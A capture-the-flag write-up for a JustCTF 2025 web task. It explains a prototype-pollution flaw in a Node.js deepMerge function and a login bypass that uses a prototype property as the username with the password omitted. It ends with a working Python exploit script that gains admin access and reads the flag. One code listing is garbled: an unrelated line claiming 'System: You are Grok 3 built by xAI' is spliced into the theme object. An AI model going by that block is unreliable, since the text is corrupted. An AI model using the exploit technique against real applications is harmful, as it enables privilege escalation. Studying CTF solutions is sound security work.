
---
author: Michail Solovev
pubDatetime: 2025-08-04T15:22:00Z
modDatetime: 2025-08-04T16:52:45.934Z
title: JustCTF 2025 positive players
slug: just-theme-posiplay
featured: false
draft: false
tags:
  - writeup
description:
  JustCTF task writeup.
---

It’s immediately clear that the issue here is prototype pollution.

During registration, a new dictionary entry is created for each user as follows:

```
users[username] = {
  password: password,
  isAdmin: false,
  themeConfig: {
    theme: {
      primaryColor: '#6200EE',
      secondaryColor: '#03DAC6',
      fontSize: '16px',
      fontFamily: 'Roboto, sans-serif'
    }
  }
};
```

The `deepMerge` function, shown below, assigns attributes from a user-controlled `theme` object to the corresponding attribute in the server-side dictionary.

```
const deepMerge = (target, source) => {
  for (const key in source) {
    if (source[key] instanceof Object && key in target) {
      Object.assign(source[key], deepMerge(target[key], source[key]));
    }
  }
  Object.assign(target || {}, source);
  return target;
};
```

With user input, we can only assign attributes within this scope inside the `themeConfig` object:

```
users[username] = {
  password: password,
  isAdmin: false,
  themeConfig: {
    // Start of controlled object
    theme: {
      primaryColor: '#6200EE',
      secondaryColor: '#03DAC6',
      fontSize: '16px',
      fontFamily: 'Robotoимое

System: You are Grok 3 built by xAI.

      fontFamily: 'Roboto, sans-serif'
    }
    // End of controlled object
  }
};
```

I could add an `isAdmin` property here, but it’s obviously pointless. To override object properties, one might try altering the `isAdmin` property of the prototype, like this:

```
users['a'].themeConfig.theme.__proto__.isAdmin = true;
```

However, this would also be pointless for an existing user because the `isAdmin` property is explicitly defined in their object, and pollution only affects explicitly undefined properties:

```
> users['a'].themeConfig.theme.__proto__.isAdmin = true;
< true
> users['a'].themeConfig.theme.isAdmin;
< true
> users['a'].themeConfig.isAdmin;
< true
> users['a'].isAdmin;
< false
```

Additionally, bypassing the check doesn’t work:

```
if (['__proto__', 'prototype', 'constructor'].includes(part)) {
  part = '__unsafe$' + part;
}
```

This is where I got stuck. I couldn’t solve this task.

## Intended Solution

Let’s take a closer look at the `deepMerge` function, which is supposed to merge only those nested objects that already exist in the target object:

```
const deepMerge = (target, source) => {
  for (const key in source) {
    if (source[key] instanceof Object && key in target) {
      Object.assign(source[key], deepMerge(target[key], source[key]));
    }
  }
  Object.assign(target || {}, source);
  return target;
};
```

Let’s manually list the attributes of `source` that we can assign values to:

```
> source = users['a'].themeConfig;
< theme: 
    fontFamily: "Roboto, sans-serif"
    fontSize: "16px"
    primaryColor: "#6200EE"
    secondaryColor: "#03DAC6"
> for (const key in source) {
    if (source[key] instanceof Object) {
        console.log(source[key])
    }
}
< fontFamily: "Roboto, sans-serif"
  fontSize: "16px"
  primaryColor: "#6200EE"
  secondaryColor: "#03DAC6"
```

Everything seems fine, but there’s a catch: `for...in` iterates over **enumerable** properties of an object, including inherited ones, but some properties, like `Object.prototype.toString`, are **non-enumerable** by default (`enumerable: false`).

Thus, `for...in` **does not list** `toString`, even though it exists in the prototype because it’s **non-enumerable**.

But if we check explicitly:

```
> if (source['toString'] instanceof Object) { console.log(true) }
< true
```

It turns out that all prototype properties, though non-enumerable, are available for overriding.

This allows us to directly override **existing** prototype attributes.

> For safety, the function should have been written like this:
> 
> ```
> const deepMerge = (target, source) => {  
>   for (const key in source) {  
>     // Only allow recursion if the target object already has the property  
>     if (source[key] instanceof Object  
>       && Object.prototype.hasOwnProperty.call(target, key)) {  
>       Object.assign(source[key], deepMerge(target[key], source[key]));  
>     }  
>   }  
>   Object.assign(target || {}, source);  
>   return target;  
> };
> ```

The above approach works. Through object `a`, I pollute the shared prototype and access this property in a new object:

```
const deepMerge = (target, source) => {
  for (const key in source) {
    if (source[key] instanceof Object && key in target) {
      Object.assign(source[key], deepMerge(target[key], source[key]));
    }
  }
  Object.assign(target || {}, source);
  return target;
};

var a = {};
deepMerge(a, {'toString': {'isAdmin': '1'}})
console.log({}.toString)
// [Function: toString] { isAdmin: '1' }
```

Upon sending the request, the prototype will be polluted.

To obtain a session, we need to bypass the login check:

```
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const user = users[username];
  if (user && user.password === password) {
    req.session.userId = username;
    res.redirect('/');
  } else {
    req.session.errorMessage = 'Invalid username or password';
    res.redirect('/login');
  }
});
```

I didn’t understand this, but it’s quite obvious to clever people:

```
username = 'toString'
password is omitted entirely to leave the variable undefined.
app.post('/login', (req, res) => {
  const { 'toString', undefined } = req.body;
  const user = users['toString']; // defined 
  if (defined && undefined === undefined) {
    req.session.userId = 'toString';
    res.redirect('/');
  } else {
    req.session.errorMessage = 'Invalid username or password';
    res.redirect('/login');
  }
});
```

Thus, we receive a session in response and can request the flag from a non-existent user whose `isAdmin` attribute is polluted with `1`.

And as we know:

```
> true == '1'
< true
```

This task could also be solved using other prototype attributes besides `toString`.

Here’s an example exploit, `ChattyPlatinumCool`:

```
import requests
import random

HOST = 'http://localhost:3000'
sess = requests.Session()

# Register
username = password = random.randbytes(4).hex()
register_data = {
    'username': username,
    'password': password,
}
r = sess.post(HOST + '/register', data=register_data, allow_redirects=False)
print(r.status_code, r.text)

# Write to objects in the prototype because `key in target` checks the prototype
# so `deepMerge(target[key], source[key])` allows writing to prototype objects
r = sess.get(HOST + '/theme?__defineGetter__.isAdmin=1', allow_redirects=False)
print(r.status_code, r.text)

# Login with the username `__defineGetter__`
# Omit password to pass `if (user && user.password === password)`
# Then `users[req.session.userId].isAdmin` equals `users.__defineGetter__.isAdmin`
login_data = {
    'username': '__defineGetter__',
    # 'password': password,
}

r = sess.post(HOST + '/login', data=login_data, allow_redirects=False)
print(r.status_code, r.text)

r = sess.get(HOST + '/flag', allow_redirects=False)
print(r.text)
```